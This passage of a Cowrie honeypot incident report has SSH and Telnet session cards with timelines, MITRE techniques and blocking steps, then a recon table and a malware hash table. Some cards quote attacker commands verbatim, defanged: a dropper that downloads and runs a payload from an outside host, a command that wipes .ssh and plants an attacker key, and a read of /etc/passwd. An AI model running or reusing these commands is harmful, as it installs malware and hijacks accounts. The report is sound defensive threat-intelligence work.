| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:22:07` | `cowrie.session.connect` |
| `2026-08-25 18:22:07` | `cowrie.client.version` |
| `2026-08-25 18:22:07` | `cowrie.client.kex` |
| `2026-08-25 18:22:08` | `cowrie.login.success` |
| `2026-08-25 18:22:08` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:22:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:22:08` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b58ef7925a0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:22 |
| **Last Seen** | 2026-08-25 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:22:12` | `cowrie.session.connect` |
| `2026-08-25 18:22:12` | `cowrie.client.version` |
| `2026-08-25 18:22:12` | `cowrie.client.kex` |
| `2026-08-25 18:22:13` | `cowrie.login.success` |
| `2026-08-25 18:22:13` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:22:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:22:13` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0fd475f7577

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:31 |
| **Last Seen** | 2026-08-25 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:31:37` | `cowrie.session.connect` |
| `2026-08-25 18:31:37` | `cowrie.client.version` |
| `2026-08-25 18:31:37` | `cowrie.client.kex` |
| `2026-08-25 18:31:38` | `cowrie.login.success` |
| `2026-08-25 18:31:38` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:31:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:31:38` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99d347b68f54

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:31 |
| **Last Seen** | 2026-08-25 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:31:40` | `cowrie.session.connect` |
| `2026-08-25 18:31:40` | `cowrie.client.version` |
| `2026-08-25 18:31:41` | `cowrie.client.kex` |
| `2026-08-25 18:31:42` | `cowrie.login.success` |
| `2026-08-25 18:31:42` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:31:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:31:42` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b30f5b49bc

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-25 18:32 |
| **Last Seen** | 2026-08-25 18:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:32:13` | `cowrie.session.connect` |
| `2026-08-25 18:32:13` | `cowrie.telnet.option` |
| `2026-08-25 18:32:13` | `cowrie.login.success` |
| `2026-08-25 18:32:14` | `cowrie.session.params` |
| `2026-08-25 18:32:14` | `cowrie.telnet.option` |
| `2026-08-25 18:32:14` | `cowrie.telnet.option` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.failed` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.success` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.failed` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.success` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.failed` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.success` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.command.failed` |
| `2026-08-25 18:32:14` | `cowrie.command.input` |
| `2026-08-25 18:32:14` | `cowrie.log.closed` |
| `2026-08-25 18:32:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f20460c0d53

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-08-25 18:37 |
| **Last Seen** | 2026-08-25 18:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:37:14` | `cowrie.session.connect` |
| `2026-08-25 18:37:14` | `cowrie.client.version` |
| `2026-08-25 18:37:14` | `cowrie.client.kex` |
| `2026-08-25 18:37:15` | `cowrie.login.success` |
| `2026-08-25 18:37:17` | `cowrie.session.params` |
| `2026-08-25 18:37:17` | `cowrie.command.input` |
| `2026-08-25 18:37:17` | `cowrie.command.failed` |
| `2026-08-25 18:37:17` | `cowrie.log.closed` |
| `2026-08-25 18:37:18` | `cowrie.session.params` |
| `2026-08-25 18:37:18` | `cowrie.command.input` |
| `2026-08-25 18:37:19` | `cowrie.session.file_download` |
| `2026-08-25 18:37:19` | `cowrie.log.closed` |
| `2026-08-25 18:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e803a90319a

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]3` |
| **First Seen** | 2026-08-25 18:37 |
| **Last Seen** | 2026-08-25 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:37:19` | `cowrie.session.connect` |
| `2026-08-25 18:37:19` | `cowrie.client.version` |
| `2026-08-25 18:37:19` | `cowrie.client.kex` |
| `2026-08-25 18:37:20` | `cowrie.login.success` |
| `2026-08-25 18:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]3` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b040c90952ed

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]3` |
| **First Seen** | 2026-08-25 18:37 |
| **Last Seen** | 2026-08-25 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:37:21` | `cowrie.session.connect` |
| `2026-08-25 18:37:21` | `cowrie.client.version` |
| `2026-08-25 18:37:21` | `cowrie.client.kex` |
| `2026-08-25 18:37:23` | `cowrie.login.success` |
| `2026-08-25 18:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]3` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5c1c1e1879d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:41 |
| **Last Seen** | 2026-08-25 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:41:14` | `cowrie.session.connect` |
| `2026-08-25 18:41:14` | `cowrie.client.version` |
| `2026-08-25 18:41:14` | `cowrie.client.kex` |
| `2026-08-25 18:41:15` | `cowrie.login.success` |
| `2026-08-25 18:41:15` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:41:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:41:15` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05722e79aa41

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:41 |
| **Last Seen** | 2026-08-25 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:41:17` | `cowrie.session.connect` |
| `2026-08-25 18:41:17` | `cowrie.client.version` |
| `2026-08-25 18:41:17` | `cowrie.client.kex` |
| `2026-08-25 18:41:18` | `cowrie.login.success` |
| `2026-08-25 18:41:18` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:41:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:41:19` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d573a57598e0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-25 18:50 |
| **Last Seen** | 2026-08-25 18:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:50:02` | `cowrie.session.connect` |
| `2026-08-25 18:50:02` | `cowrie.client.version` |
| `2026-08-25 18:50:02` | `cowrie.client.kex` |
| `2026-08-25 18:50:02` | `cowrie.login.success` |
| `2026-08-25 18:50:02` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:50:02` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75a9321ec09b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:50 |
| **Last Seen** | 2026-08-25 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:50:39` | `cowrie.session.connect` |
| `2026-08-25 18:50:39` | `cowrie.client.version` |
| `2026-08-25 18:50:39` | `cowrie.client.kex` |
| `2026-08-25 18:50:40` | `cowrie.login.success` |
| `2026-08-25 18:50:40` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:50:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:50:40` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a6eb2ef2b99

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 18:50 |
| **Last Seen** | 2026-08-25 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:50:43` | `cowrie.session.connect` |
| `2026-08-25 18:50:43` | `cowrie.client.version` |
| `2026-08-25 18:50:43` | `cowrie.client.kex` |
| `2026-08-25 18:50:44` | `cowrie.login.success` |
| `2026-08-25 18:50:44` | `cowrie.direct-tcpip.request` |
| `2026-08-25 18:50:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 18:50:44` | `cowrie.direct-tcpip.data` |
| `2026-08-25 18:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a11f1e85e43f

| Field | Detail |
|---|---|
| **Source IP** | `8.211.183[.]26` |
| **First Seen** | 2026-08-25 18:51 |
| **Last Seen** | 2026-08-25 18:52 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:51:57` | `cowrie.session.connect` |
| `2026-08-25 18:51:58` | `cowrie.telnet.option` |
| `2026-08-25 18:51:58` | `cowrie.telnet.option` |
| `2026-08-25 18:51:58` | `cowrie.login.success` |
| `2026-08-25 18:51:58` | `cowrie.session.params` |
| `2026-08-25 18:51:59` | `cowrie.telnet.option` |
| `2026-08-25 18:51:59` | `cowrie.telnet.option` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.failed` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.failed` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.failed` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.failed` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.failed` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.failed` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.failed` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.failed` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:51:59` | `cowrie.command.input` |
| `2026-08-25 18:52:59` | `cowrie.log.closed` |
| `2026-08-25 18:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.211.183[.]26` to AbuseIPDB if not already reported
- [ ] Block `8.211.183[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4319b6047d5

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-25 18:53 |
| **Last Seen** | 2026-08-25 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:53:07` | `cowrie.session.connect` |
| `2026-08-25 18:53:07` | `cowrie.client.version` |
| `2026-08-25 18:53:07` | `cowrie.client.kex` |
| `2026-08-25 18:53:08` | `cowrie.login.success` |
| `2026-08-25 18:53:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdfb33457f58

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-25 18:53 |
| **Last Seen** | 2026-08-25 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 18:53:07` | `cowrie.session.connect` |
| `2026-08-25 18:53:07` | `cowrie.client.version` |
| `2026-08-25 18:53:08` | `cowrie.client.kex` |
| `2026-08-25 18:53:08` | `cowrie.login.success` |
| `2026-08-25 18:53:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]44` | **37** | 2026-08-25 16:55 | 2026-08-25 18:51 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `134.209.229[.]23` | **4** | 2026-08-25 17:14 | 2026-08-25 18:33 | 4m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-25 17:15 | 2026-08-25 18:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.211.255[.]58` | **3** | 2026-08-25 17:45 | 2026-08-25 17:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-25 17:18 | 2026-08-25 18:17 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]37` | **2** | 2026-08-25 17:53 | 2026-08-25 17:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.145.238[.]115` | 1 | 2026-08-25 17:15 | 2026-08-25 17:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.242[.]127` | 1 | 2026-08-25 17:28 | 2026-08-25 17:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `136.116.129[.]132` | 1 | 2026-08-25 17:10 | 2026-08-25 17:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.144.159[.]201` | 1 | 2026-08-25 18:17 | 2026-08-25 18:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.150.236[.]72` | 1 | 2026-08-25 18:41 | 2026-08-25 18:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-08-25 18:43 | 2026-08-25 18:43 | 3s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-08-25 17:12 | 2026-08-25 17:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]109` | 1 | 2026-08-25 18:04 | 2026-08-25 18:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]5` | 1 | 2026-08-25 17:55 | 2026-08-25 17:55 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
